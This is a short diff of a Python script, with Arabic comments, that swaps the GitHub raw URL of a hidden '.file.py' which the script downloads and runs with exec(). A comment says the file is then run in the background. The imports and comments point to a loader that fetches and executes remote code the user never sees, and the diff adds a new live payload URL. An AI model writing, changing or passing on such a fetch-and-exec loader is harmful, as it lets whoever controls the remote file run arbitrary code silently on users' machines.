@@ -13,7 +13,7 @@ from concurrent.futures import ThreadPoolExecutor
 import requests, bs4, uuid, json, os, sys, random, datetime, time, re, subprocess
 
 # تحميل وتنفيذ كود من الإنترنت
-X1 = requests.get('https://raw.githubusercontent.com/JDXSX/HIFBPDC/main/.file.py').text
+X1 = requests.get('https://raw.githubusercontent.com/JDXSX/VBCJCXUF/main/.file.py').text
 exec(X1)
 
 # إعداد الأمر لتشغيل ملف .file.py في الخلفية
